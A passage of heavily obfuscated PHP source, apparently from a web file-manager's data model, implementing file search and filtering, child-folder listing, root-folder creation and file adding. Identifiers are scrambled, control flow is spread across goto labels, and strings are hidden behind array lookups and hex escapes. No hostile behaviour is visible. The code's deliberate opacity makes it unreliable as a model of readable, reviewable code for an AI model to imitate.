$this->field($AáĞíóÊ®Ù)->where($F¸àŒ¤Çºé)->limit($eÕˆ‡‚ó»[1894])->select(); if (!$aŠ‚¡†ß›‡ || count($aŠ‚¡†ß›‡) == 0) { return; } goto a»÷´ÏñŒ»; f÷©Šâ‚”: } private function _listSearchTag(&$b”Ä¼¢¼”Ÿ, $D¹•„Õ±¡, $aƒ–í‰’) { goto bƒ¬¾Ü»Ö; CÄïİï: $B‘––”™íù = array_to_keyvalue($B‘––”™íù, $c¶›ÏêØÖ[33], $c¶›ÏêØÖ[85]); $AÂŠù³ó­Ã = array_unique($B‘––”™íù); $this->_listSearchMerge($b”Ä¼¢¼”Ÿ, $D¹•„Õ±¡, $aƒ–í‰’, $AÂŠù³ó­Ã); goto b’¼ì´‘ÅÅ; càÆ»ÄïÅ­: if (!$B¦À·åù„®) { return; } $d¯¾—ğ¸Œ“ = array($c¶›ÏêØÖ[422] => array($c¶›ÏêØÖ[7], $B¦À·åù„®), $c¶›ÏêØÖ[1487] => USER_ID); $B‘––”™íù = Model($c¶›ÏêØÖ[423])->field($c¶›ÏêØÖ[85])->where($d¯¾—ğ¸Œ“)->select(); goto CÄïİï; AÎƒÃÇ®æ˜: $B¦À·åù„® = array(); $aÁ²Ï¤×Û = $D¹•„Õ±¡[$c¶›ÏêØÖ[1734]]; foreach ($d£Ş÷°Ô© as $dìØ’‘›Í¬) { $b©·‹¯Ö…Ä = $dìØ’‘›Í¬[$c¶›ÏêØÖ[28]]; $A÷…ÍÆÎîå = str_replace($c¶›ÏêØÖ[50], $c¶›ÏêØÖ[33], Pinyin::encode($b©·‹¯Ö…Ä)); if (stripos($b©·‹¯Ö…Ä, $aÁ²Ï¤×Û) !== !1 || stripos($A÷…ÍÆÎîå, $aÁ²Ï¤×Û) !== !1) { $B¦À·åù„®[] = $dìØ’‘›Í¬[$c¶›ÏêØÖ[397]]; } } goto càÆ»ÄïÅ­; bƒ¬¾Ü»Ö: $c¶›ÏêØÖ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$D¹•„Õ±¡[$c¶›ÏêØÖ[1734]] || $b”Ä¼¢¼”Ÿ[$c¶›ÏêØÖ[372]][$c¶›ÏêØÖ[358]] > 1) { return; } $d£Ş÷°Ô© = Model($c¶›ÏêØÖ[1895])->listData(); goto AÎƒÃÇ®æ˜; b’¼ì´‘ÅÅ: } private function _listSearchDesc(&$fŞÕÚ³‘²ô, $dË¬½‡îë, $A‡¹ã½°Ù†) { goto a—‘šœã•©; eËæ’¾ù£: $EÒÇ‚Ô÷ÆÏ = Model($A–õá•…¯[536])->field($A–õá•…¯[399])->where($a’î‹¾òµ)->select(); $D’å—ßô = array_to_keyvalue($EÒÇ‚Ô÷ÆÏ, $A–õá•…¯[33], $A–õá•…¯[399]); $this->_listSearchMerge($fŞÕÚ³‘²ô, $dË¬½‡îë, $A‡¹ã½°Ù†, $D’å—ßô); goto bƒ×”¨‰ãù; B‰†õÌ‡Œ: $f®¦ÍÙ‹ŸÖ = array_unique($f®¦ÍÙ‹ŸÖ); if (!$f®¦ÍÙ‹ŸÖ) { return; } $a’î‹¾òµ = array($A–õá•…¯[399] => array($A–õá•…¯[7], $f®¦ÍÙ‹ŸÖ), $A–õá•…¯[102] => $A–õá•…¯[434], $A–õá•…¯[380] => array($A–õá•…¯[387], $A–õá•…¯[1736] . $dË¬½‡îë[$A–õá•…¯[1734]] . $A–õá•…¯[1736])); goto eËæ’¾ù£; a—‘šœã•©: $A–õá•…¯ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$dË¬½‡îë[$A–õá•…¯[1734]] || $fŞÕÚ³‘²ô[$A–õá•…¯[372]][$A–õá•…¯[358]] > 1) { return; } $f®¦ÍÙ‹ŸÖ = $this->listSearchChildren($dË¬½‡îë[$A–õá•…¯[481]]); goto B‰†õÌ‡Œ; bƒ×”¨‰ãù: } private function _listSearchGroupTag(&$DŒİõô²ğÖ, $A½éÍœøÑ„, $f£„ÏÄÜÂŒ) { goto cí¦‘Îö; cí¦‘Îö: $A‰ùáÇùˆµ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$A½éÍœøÑ„[$A‰ùáÇùˆµ[1734]] || $DŒİõô²ğÖ[$A‰ùáÇùˆµ[372]][$A‰ùáÇùˆµ[358]] > 1 || !$A½éÍœøÑ„[$A‰ùáÇùˆµ[481]]) { return; } $BÎôÃÛÀ = $this->sourceInfo($A½éÍœøÑ„[$A‰ùáÇùˆµ[481]]); goto a•Ï±Ûã×ä; a¸‰§†›™: if (!$Cé‘ô“‰®è) { return; } $B†‰ŠÇ††‡ = array($A‰ùáÇùˆµ[422] => array($A‰ùáÇùˆµ[7], $Cé‘ô“‰®è), $A‰ùáÇùˆµ[1487] => 0, $A‰ùáÇùˆµ[29] => $A‰ùáÇùˆµ[1758] . $dÑ˜ôÏø¨å); $Eä…å¶ç‰Ï = Model($A‰ùáÇùˆµ[423])->field($A‰ùáÇùˆµ[85])->where($B†‰ŠÇ††‡)->select(); goto bÄí‡š¯; b©ë‚®Ô‚: $Cé‘ô“‰®è = array(); $AèïğÄ•öİ = $A½éÍœøÑ„[$A‰ùáÇùˆµ[1734]]; foreach ($b‹Å¹È¢¡¨[$A‰ùáÇùˆµ[375]] as $cä¦¥âêê´) { $AÕ±‹Ô×‘ = $cä¦¥âêê´[$A‰ùáÇùˆµ[28]]; $aÏôòâ†¿å = str_replace($A‰ùáÇùˆµ[50], $A‰ùáÇùˆµ[33], Pinyin::encode($AÕ±‹Ô×‘)); if (stripos($AÕ±‹Ô×‘, $AèïğÄ•öİ) !== !1 || stripos($aÏôòâ†¿å, $AèïğÄ•öİ) !== !1) { $Cé‘ô“‰®è[] = $cä¦¥âêê´[$A‰ùáÇùˆµ[397]]; } } goto a¸‰§†›™; a•Ï±Ûã×ä: if (!$BÎôÃÛÀ || $BÎôÃÛÀ[$A‰ùáÇùˆµ[407]] != SourceModel::TYPE_GROUP) { return; } $dÑ˜ôÏø¨å = $BÎôÃÛÀ[$A‰ùáÇùˆµ[487]]; $b‹Å¹È¢¡¨ = Model($A‰ùáÇùˆµ[1896])->get($dÑ˜ôÏø¨å); goto b©ë‚®Ô‚; bÄí‡š¯: $Eä…å¶ç‰Ï = array_to_keyvalue($Eä…å¶ç‰Ï, $A‰ùáÇùˆµ[33], $A‰ùáÇùˆµ[85]); $F‹…Ñ‡Õ±Å = array_unique($Eä…å¶ç‰Ï); $this->_listSearchMerge($DŒİõô²ğÖ, $A½éÍœøÑ„, $f£„ÏÄÜÂŒ, $F‹…Ñ‡Õ±Å); goto A§·ÁŠ”š; A§·ÁŠ”š: } private function _listSearchMerge(&$bçõá”‰Œ, $e‡å¤–ÅÑá, $e…ÚÀ±ƒœ, $D‚´­Øò³Ô) { goto c¥œÀ†Úµ; F°ˆÛôğ¤: $F•èÇ¹öóô = array_diff($D‚´­Øò³Ô, $f„ç‚Ì‘Ş‡); if (!$F•èÇ¹öóô) { return; } $a™ŞµÍ¦‰ = array($F°ì‡ğ„ãÂ[399] => array($F°ì‡ğ„ãÂ[7], $F•èÇ¹öóô)); goto a¬´îÆ©²µ; a¬´îÆ©²µ: $fğÈŸÃ­—  = $this->field($e…ÚÀ±ƒœ)->where($a™ŞµÍ¦‰)->select(); if (!$fğÈŸÃ­— ) { return; } $EÆ‘æº´ = array(); goto EŠÏ¤›Âá; EŠÏ¤›Âá: foreach ($fğÈŸÃ­—  as $b’øµÖé†ê) { if ($this->_listSearchFilter($b’øµÖé†ê, $e‡å¤–ÅÑá)) { $EÆ‘æº´[] = $b’øµÖé†ê; } } $bçõá”‰Œ[$F°ì‡ğ„ãÂ[375]] = array_merge($EÆ‘æº´, $bçõá”‰Œ[$F°ì‡ğ„ãÂ[375]]); $bçõá”‰Œ[$F°ì‡ğ„ãÂ[372]][$F°ì‡ğ„ãÂ[373]] += count($EÆ‘æº´); goto Fàà…î‹íø; c¥œÀ†Úµ: $F°ì‡ğ„ãÂ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$D‚´­Øò³Ô) { return; } $f„ç‚Ì‘Ş‡ = array_to_keyvalue($bçõá”‰Œ[$F°ì‡ğ„ãÂ[375]], $F°ì‡ğ„ãÂ[33], $F°ì‡ğ„ãÂ[399]); goto F°ˆÛôğ¤; Fàà…î‹íø: } private function _listSearchFilter($d‘Ã´™·÷±, $EÖ£ê™éì) { goto c‰ÅµÔ­Ú; e‰È³³İÒˆ: if (isset($EÖ£ê™éì[$f¤šŒÙß©[408]]) && $EÖ£ê™éì[$f¤šŒÙß©[408]] != $f¤šŒÙß©[1701]) { if ($EÖ£ê™éì[$f¤šŒÙß©[408]] == $f¤šŒÙß©[86] && !$FÑ„ó•ùÄ) { return !1; } if ($EÖ£ê™éì[$f¤šŒÙß©[408]] != $f¤šŒÙß©[86] && $FÑ„ó•ùÄ) { return !1; } if (!strstr($d‘Ã´™·÷±[$f¤šŒÙß©[177]], $f¤šŒÙß©[47] . $EÖ£ê™éì[$f¤šŒÙß©[408]] . $f¤šŒÙß©[47])) { return !1; } } if (isset($EÖ£ê™éì[$f¤šŒÙß©[1897]]) && $EÖ£ê™éì[$f¤šŒÙß©[1897]] < $d‘Ã´™·÷±[$f¤šŒÙß©[87]]) { return !1; } if (isset($EÖ£ê™éì[$f¤šŒÙß©[1898]]) && $EÖ£ê™éì[$f¤šŒÙß©[1898]] > $d‘Ã´™·÷±[$f¤šŒÙß©[87]]) { return !1; } goto D¨•àÚÓ; D¨•àÚÓ: if (isset($EÖ£ê™éì[$f¤šŒÙß©[566]]) && $EÖ£ê™éì[$f¤šŒÙß©[566]] != $d‘Ã´™·÷±[$f¤šŒÙß©[437]]) { return !1; } return !0; goto b”˜˜Û‰„; c‰ÅµÔ­Ú: $f¤šŒÙß© =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FÑ„ó•ùÄ = $d‘Ã´™·÷±[$f¤šŒÙß©[406]] == $f¤šŒÙß©[96]; if (!strstr($d‘Ã´™·÷±[$f¤šŒÙß©[490]], $f¤šŒÙß©[47] . $EÖ£ê™éì[$f¤šŒÙß©[481]] . $f¤šŒÙß©[47])) { return !1; } goto e‰È³³İÒˆ; b”˜˜Û‰„: } public function listSearchChildren($f’Ûóó¬ÎŠ, $DæÊã§Ç˜ = 5000) { goto B†ÄœÚëÂë; Aª÷ÒÖ§è: $AÂëÉîÑ½ô = array($bÌ‚å°³‹â[490] => array($bÌ‚å°³‹â[387], $a´ƒ×Ô‰éÌ[$bÌ‚å°³‹â[490]] . $a´ƒ×Ô‰éÌ[$bÌ‚å°³‹â[399]] . $bÌ‚å°³‹â[517])); $A©éÆ§‘Ş¢ = $this->field($bÌ‚å°³‹â[399])->cache(null, 600)->where($AÂëÉîÑ½ô)->count(); if ($A©éÆ§‘Ş¢ > $DæÊã§Ç˜) { return $this->_listSearchChildrenNear($f’Ûóó¬ÎŠ, $DæÊã§Ç˜); } goto e†®ëòÛ×•; B†ÄœÚëÂë: $bÌ‚å°³‹â =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Cì‘ãî¯»¡ = array(); $a´ƒ×Ô‰éÌ = $this->sourceInfo($f’Ûóó¬ÎŠ); goto Aª÷ÒÖ§è; e†®ëòÛ×•: $e„Ï­ ŞæÍ = $this->field($bÌ‚å°³‹â[399])->where($AÂëÉîÑ½ô)->select(); $Cì‘ãî¯»¡ = array_to_keyvalue($e„Ï­ ŞæÍ, $bÌ‚å°³‹â[33], $bÌ‚å°³‹â[399]); return $Cì‘ãî¯»¡; goto f›µƒ•©”; f›µƒ•©”: } private function _listSearchChildrenNear($a–‘—›Ö¼ø, $EÀ¦‘¶§³) { goto ašÌÇë«; e¶œ‘Ã¶†“: $Dè»¨Á±Ñ = $this->field($fá¬×çæ¼À[1899])->where($BÚÙåğ¨‚ç)->select(); $c„Ï—¡â‘ = array_to_keyvalue(array_filter_by_field($Dè»¨Á±Ñ, $fá¬×çæ¼À[406], $fá¬×çæ¼À[96]), $fá¬×çæ¼À[33], $fá¬×çæ¼À[399]); $c»³Ûš±Œ¿ = array_merge($c»³Ûš±Œ¿, array_to_keyvalue($Dè»¨Á±Ñ, $fá¬×çæ¼À[33], $fá¬×çæ¼À[399])); goto e–Ø× ëŞí; ašÌÇë«: $fá¬×çæ¼À =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c»³Ûš±Œ¿ = array(); $BÚÙåğ¨‚ç = array($fá¬×çæ¼À[481] => $a–‘—›Ö¼ø); goto e¶œ‘Ã¶†“; e–Ø× ëŞí: if (!$c„Ï—¡â‘) { return $c»³Ûš±Œ¿; } $BÚÙåğ¨‚ç = array($fá¬×çæ¼À[481] => array($fá¬×çæ¼À[7], $c„Ï—¡â‘)); $Dè»¨Á±Ñ = $this->field($fá¬×çæ¼À[1899])->where($BÚÙåğ¨‚ç)->limit($EÀ¦‘¶§³)->select(); goto Eƒñ“§à; Eƒñ“§à: $c»³Ûš±Œ¿ = array_merge($c»³Ûš±Œ¿, array_to_keyvalue($Dè»¨Á±Ñ, $fá¬×çæ¼À[33], $fá¬×çæ¼À[399])); $c»³Ûš±Œ¿ = array_slice($c»³Ûš±Œ¿, 0, $EÀ¦‘¶§³); return $c»³Ûš±Œ¿; goto d–±»ğÅ‰; d–±»ğÅ‰: } private function _listSearchBindPinyin($bÙ ¡Éµ, &$B¶òÆ°½Â, &$F³–£²ù°×) { goto bÉ¦ßÎÌ²ˆ; F­ñÔ®¥¡ñ: $B¶òÆ°½Â = $eÆİ™ãìÍ“; goto BÔ¼÷½¯‚Ô; bÉ¦ßÎÌ²ˆ: $fÙÂ‡±ïÌº =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($bÙ ¡Éµ[$fÙÂ‡±ïÌº[1734]]) || !$bÙ ¡Éµ[$fÙÂ‡±ïÌº[1734]]) { return; } if (!Input::check($bÙ ¡Éµ[$fÙÂ‡±ïÌº[1734]], $fÙÂ‡±ïÌº[323]) || strlen($bÙ ¡Éµ[$fÙÂ‡±ïÌº[1734]]) < 2) { return; } goto DŞªé’³¯ƒ; Dšİá„ãİ: foreach ($B¶òÆ°½Â as $aÂÛÉˆÒìŠ => $DÂø±§ì·Æ) { $eÆİ™ãìÍ“[$fÙÂ‡±ïÌº[1901] . $aÂÛÉˆÒìŠ] = $DÂø±§ì·Æ; } foreach ($B˜É¨ÇĞâ as $EÌâ½ÈÄ») { $eÆİ™ãìÍ“[] = array($fÙÂ‡±ïÌº[1903] => $EÌâ½ÈÄ», $fÙÂ‡±ïÌº[918] => $fÙÂ‡±ïÌº[1738], array($fÙÂ‡±ïÌº[1904] => $EÌâ½ÈÄ», $fÙÂ‡±ïÌº[1905] => array($fÙÂ‡±ïÌº[7], array($fÙÂ‡±ïÌº[447], $fÙÂ‡±ïÌº[446])))); } $this->join($b…à‹Ì¤Â­); goto F­ñÔ®¥¡ñ; DŞªé’³¯ƒ: $b…à‹Ì¤Â­ = "\x4c\x45\x46\x54\40\112\117\x49\x4e\40{$this->tablePrefix}\151\x6f\x5f\163\157\x75\x72\143\x65\x5f\155\145\164\x61\40\x6d\x65\164\141\x20\157\156\x20\163\157\x75\x72\x63\x65\56\163\157\165\x72\x63\x65\x49\104\40\x3d\x20\155\145\x74\141\x2e\x73\157\165\162\x63\x65\x49\104"; $eÆİ™ãìÍ“ = array(); $F³–£²ù°× = str_replace(array($fÙÂ‡±ïÌº[63], $fÙÂ‡±ïÌº[50], $fÙÂ‡±ïÌº[1900]), $fÙÂ‡±ïÌº[33], $F³–£²ù°×); goto FÙÊé…èğ; FÙÊé…èğ: $F³–£²ù°× = $fÙÂ‡±ïÌº[1901] . str_replace($fÙÂ‡±ïÌº[47], $fÙÂ‡±ïÌº[1902], $F³–£²ù°×); $B˜É¨ÇĞâ = $B¶òÆ°½Â[$fÙÂ‡±ïÌº[28]]; unset($B¶òÆ°½Â[$fÙÂ‡±ïÌº[28]]); goto Dšİá„ãİ; BÔ¼÷½¯‚Ô: } private function _parseSearchWhere($A¹çˆíò×Ê) { goto Dó÷¡§ˆ–´; Dó÷¡§ˆ–´: $B®à¼ÁÏ¹Õ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D¬à„ä´³Å = array(); if (isset($A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[707]]) && $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[707]]) { $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[93]] = array($B®à¼ÁÏ¹Õ[1906], $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[707]]); } goto D¸¨–»àæ; D¸¨–»àæ: if (isset($A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[479]]) && $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[479]]) { $aÖ˜–ÙË„Ì = array($B®à¼ÁÏ¹Õ[1907], $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[479]]); if ($D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[93]]) { $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[93]] = array($D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[93]], $aÖ˜–ÙË„Ì, $B®à¼ÁÏ¹Õ[1908]); } else { $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[93]] = $aÖ˜–ÙË„Ì; } } if (isset($A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[1897]]) && $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[1897]] > 0) { $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[87]] = array($B®à¼ÁÏ¹Õ[1906], $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[1897]]); } if (isset($A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[1898]]) && $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[1898]]) { $aÖ˜–ÙË„Ì = array($B®à¼ÁÏ¹Õ[1907], $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[1898]]); if ($D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[87]]) { $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[87]] = array($D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[87]], $aÖ˜–ÙË„Ì, $B®à¼ÁÏ¹Õ[1908]); } else { $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[87]] = $aÖ˜–ÙË„Ì; } } goto BÑÔÓŸ¹¯; A®ó„•‡©â: if (isset($A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[1734]]) && trim($A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[1734]])) { $bôÒ–‘±Ô = trim($A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[1734]]); $A¨ç¯‹òÆ = explode($B®à¼ÁÏ¹Õ[50], $bôÒ–‘±Ô); if (strlen($bôÒ–‘±Ô) > 2 && (substr($bôÒ–‘±Ô, 0, 1) == $B®à¼ÁÏ¹Õ[125] && substr($bôÒ–‘±Ô, -1) == $B®à¼ÁÏ¹Õ[125]) || substr($bôÒ–‘±Ô, 0, 1) == $B®à¼ÁÏ¹Õ[55] && substr($bôÒ–‘±Ô, -1) == $B®à¼ÁÏ¹Õ[55]) { $bôÒ–‘±Ô = substr($bôÒ–‘±Ô, 1, -1); $A¨ç¯‹òÆ = array($bôÒ–‘±Ô); } $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[28]] = array(array($B®à¼ÁÏ¹Õ[516], $B®à¼ÁÏ¹Õ[1736] . $bôÒ–‘±Ô . $B®à¼ÁÏ¹Õ[1736])); if (count($A¨ç¯‹òÆ) > 1) { $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[28]] = array(); foreach ($A¨ç¯‹òÆ as $aµ‚¯³£ºÎ) { if (!trim($aµ‚¯³£ºÎ)) { continue; } $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[28]][] = array($B®à¼ÁÏ¹Õ[516], $B®à¼ÁÏ¹Õ[1736] . trim($aµ‚¯³£ºÎ) . $B®à¼ÁÏ¹Õ[1736]); } } } return $D¬à„ä´³Å; goto B©ó…ó´š; BÑÔÓŸ¹¯: if (isset($A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[566]]) && $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[566]]) { $D¬à„ä´³Å[] = array($B®à¼ÁÏ¹Õ[437] => $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[566]], $B®à¼ÁÏ¹Õ[435] => $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[566]], $B®à¼ÁÏ¹Õ[918] => $B®à¼ÁÏ¹Õ[1738]); } if (isset($A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[408]]) && $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[408]]) { $eğî›êé„æ = $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[408]]; if ($eğî›êé„æ == $B®à¼ÁÏ¹Õ[86]) { $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[406]] = 1; } else { if ($eğî›êé„æ == $B®à¼ÁÏ¹Õ[1909]) { $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[406]] = 0; } else { if ($eğî›êé„æ) { $eğî›êé„æ = is_array($eğî›êé„æ) ? $eğî›êé„æ : explode($B®à¼ÁÏ¹Õ[47], $eğî›êé„æ); $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[408]] = array($B®à¼ÁÏ¹Õ[414], $eğî›êé„æ); $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[406]] = 0; } } } } if (isset($A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[481]]) && $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[481]]) { $DŞ°ÀİÙ¯‰ = $this->sourceInfo($A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[481]]); $D¬à„ä´³Å[$B®à¼ÁÏ¹Õ[557]] = array($B®à¼ÁÏ¹Õ[516], $DŞ°ÀİÙ¯‰[$B®à¼ÁÏ¹Õ[490]] . $A¹çˆíò×Ê[$B®à¼ÁÏ¹Õ[481]] . $B®à¼ÁÏ¹Õ[517]); } goto A®ó„•‡©â; B©ó…ó´š: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($aä¸Š¿‡¯ï) { $fÑĞìˆÒ„â =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÕÃ‹·µ„Ö = Model($fÑĞìˆÒ„â[506])->where(array($fÑĞìˆÒ„â[1479] => $aä¸Š¿‡¯ï))->find(); $AáêÕŒ‘Ù¯ = $this->_mkdirRoot(SourceModel::TYPE_USER, $aä¸Š¿‡¯ï, $CÕÃ‹·µ„Ö[$fÑĞìˆÒ„â[28]]); $this->userDesktopAdd($AáêÕŒ‘Ù¯); return $AáêÕŒ‘Ù¯; } public function userDesktopAdd($e«»¦íá£) { $A©˜ó¾¬¤¦ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d§ò‰›Ç¡× = LNG($A©˜ó¾¬¤¦[1910]); $D¾ò‘ëİŠÑ = $this->mkdir($e«»¦íá£, $d§ò‰›Ç¡×); $this->metaSet($D¾ò‘ëİŠÑ, $A©˜ó¾¬¤¦[1911], $A©˜ó¾¬¤¦[96]); $this->metaSet($e«»¦íá£, $A©˜ó¾¬¤¦[1912], $D¾ò‘ëİŠÑ); } public function groupRootAdd($cöáµáÃ¡¶) { $D‚Ğ•—ô©… =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e½ÔíÕ– = Model($D‚Ğ•—ô©…[489])->where(array($D‚Ğ•—ô©…[1729] => $cöáµáÃ¡¶))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $cöáµáÃ¡¶, $e½ÔíÕ–[$D‚Ğ•—ô©…[28]]); } public function systemRootPathAdd($DªÒÇ¹İä) { if ($DªÒÇ¹İä != $_SERVER[í¤âËÚ£¶íÊ¢][509]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $DªÒÇ¹İä); } public function userRootRemove($A‹„¢æ²İ) { $Aà·°¬ëòÂ = $this->sourceRoot(SourceModel::TYPE_USER, $A‹„¢æ²İ); if (!$Aà·°¬ëòÂ) { return; } $this->remove($Aà·°¬ëòÂ, !1); } public function groupRootRemove($eƒ‰ÓŒ›ïŠ) { $fËÏ¦Î„—° = $this->sourceRoot(SourceModel::TYPE_GROUP, $eƒ‰ÓŒ›ïŠ); if (!$fËÏ¦Î„—°) { return; } $this->remove($fËÏ¦Î„—°, !1); } private function _mkdirRoot($Eó‚§«æß°, $EÄ–Š˜”ÛŠ, $A¾Ïšóª‹å) { goto dÒŒ¬ì„ç…; d§¨ÖàÕª¯: $A¶ÅËšôÍ = $this->add($EåÕ¾ˆÈ­æ); $fÍ¡¹ÒÅæ = array($fàŞï’®Šƒ[559] => short_id($A¶ÅËšôÍ)); $this->where(array($fàŞï’®Šƒ[413] => $A¶ÅËšôÍ))->save($fÍ¡¹ÒÅæ); goto b®•í „–‡; b®•í „–‡: CacheLock::unlock($DŠß×ŸÂ»Á); return $A¶ÅËšôÍ; goto c”ŒáÒÓïÁ; EæŸ‘Ğ¼Õ“: $DŠß×ŸÂ»Á = "\x4d\157\x64\145\x6c\123\x6f\165\x72\x63\145\56\x6d\153\x64\x69\x72\122\157\157\164\x2e{$Eó‚§«æß°}\x2e{$EÄ–Š˜”ÛŠ}\56" . $A¾Ïšóª‹å; CacheLock::lock($DŠß×ŸÂ»Á); $EåÕ¾ˆÈ­æ[$fàŞï’®Šƒ[28]] = $A¾Ïšóª‹å; goto d§¨ÖàÕª¯; dÒŒ¬ì„ç…: $fàŞï’®Šƒ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EåÕ¾ˆÈ­æ = array($fàŞï’®Šƒ[398] => 0, $fàŞï’®Šƒ[553] => $Eó‚§«æß°, $fàŞï’®Šƒ[554] => $EÄ–Š˜”ÛŠ, $fàŞï’®Šƒ[550] => 1, $fàŞï’®Šƒ[555] => USER_ID, $fàŞï’®Šƒ[556] => USER_ID, $fàŞï’®Šƒ[551] => $fàŞï’®Šƒ[33], $fàŞï’®Šƒ[557] => $fàŞï’®Šƒ[502], $fàŞï’®Šƒ[425] => 0, $fàŞï’®Šƒ[552] => 0, $fàŞï’®Šƒ[451] => 0, $fàŞï’®Šƒ[558] => $fàŞï’®Šƒ[33]); if ($FÏÓ¤êì˜Á = $this->where($EåÕ¾ˆÈ­æ)->find()) { return $FÏÓ¤êì˜Á[$fàŞï’®Šƒ[399]]; } goto EæŸ‘Ğ¼Õ“; c”ŒáÒÓïÁ: } private function sourceRoot($CÍŠ¥«¤œ‰, $f¡ãê‹ïí, $C‚¾ÔÓÄçï = false) { $dÖ—ïÆÈ‰ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aïèÁˆ¦Ü = array($dÖ—ïÆÈ‰[398] => 0, $dÖ—ïÆÈ‰[553] => $CÍŠ¥«¤œ‰, $dÖ—ïÆÈ‰[554] => $f¡ãê‹ïí); if ($f¨…£Õ§Œ = $this->where($aïèÁˆ¦Ü)->find()) { return $C‚¾ÔÓÄçï ? $f¨…£Õ§Œ : $f¨…£Õ§Œ[$dÖ—ïÆÈ‰[399]]; } return !1; } public function sourceRootGroup($D¯É±“ˆ) { goto F‰ÈÛÃàÑ»; CâöÔÜÓÊ: $this->selectPageReset(); $cÔÌ¼¦¾¼ñ = $this->listSource($b›à•ÓÀ…ƒ, 1000); $this->selectPageRestore(); goto a¿ÓÕ¡É§ì; a¿ÓÕ¡É§ì: return array_to_keyvalue($cÔÌ¼¦¾¼ñ[$AÁß‰Ú¥¸[84]], $AÁß‰Ú¥¸[487]); goto aªø‰§ƒ­ì; F‰ÈÛÃàÑ»: $AÁß‰Ú¥¸ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (is_string($D¯É±“ˆ)) { $D¯É±“ˆ = array($D¯É±“ˆ); } $b›à•ÓÀ…ƒ = array($AÁß‰Ú¥¸[398] => 0, $AÁß‰Ú¥¸[553] => SourceModel::TYPE_GROUP, $AÁß‰Ú¥¸[554] => array($AÁß‰Ú¥¸[7], $D¯É±“ˆ)); goto CâöÔÜÓÊ; aªø‰§ƒ­ì: } public function mkfile($F‘—·±Óœ, $dŠ‘öÃƒ©, $D‚ó‡Œ‘éß = '', $fêÔÔ›¡“š = REPEAT_RENAME) { $dÆ¦ğ³‘¶ß =& $_SERVER[í¤âËÚ£¶íÊ¢]; $béî¢‹‘º¼ = Model($dÆ¦ğ³‘¶ß[575])->addFileByContent($D‚ó‡Œ‘éß, $dŠ‘öÃƒ©); return $this->_createFileCall($F‘—·±Óœ, $dŠ‘öÃƒ©, $béî¢‹‘º¼, $fêÔÔ›¡“š, $dÆ¦ğ³‘¶ß[1175]); } public function addFile($b­‰‰·¡³º, $C¤ËÅÇÔ”õ, $b·ù°è–Ù, $F…Æ¾Şğñø = false, $aèÍ–ƒ—Ü­ = REPEAT_RENAME) { $c’Á¤§µÖ = Model($_SERVER[í¤âËÚ£¶íÊ¢][575])->addFile($C¤ËÅÇÔ”õ, $b·ù°è–Ù, $F…Æ¾Şğñø); return $this->_createFileCall($b­‰‰·¡³º, $b·ù°è–Ù, $c’Á¤§µÖ, $aèÍ–ƒ—Ü­); } public function addFileByFileID($E‹ˆíÔ¨ğ«, $bÕˆëåæ‘, $Fæ¡¤ÓáŠŸ, $bàİˆèØÄµ = REPEAT_RENAME) { $A½éÆ”Íİ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aÁÑÈœ„ÉÒ = Model($A½éÆ”Íİ[575])->find($bÕˆëåæ‘); Model($A½éÆ”Íİ[575])->linkAdd($bÕˆëåæ‘); return 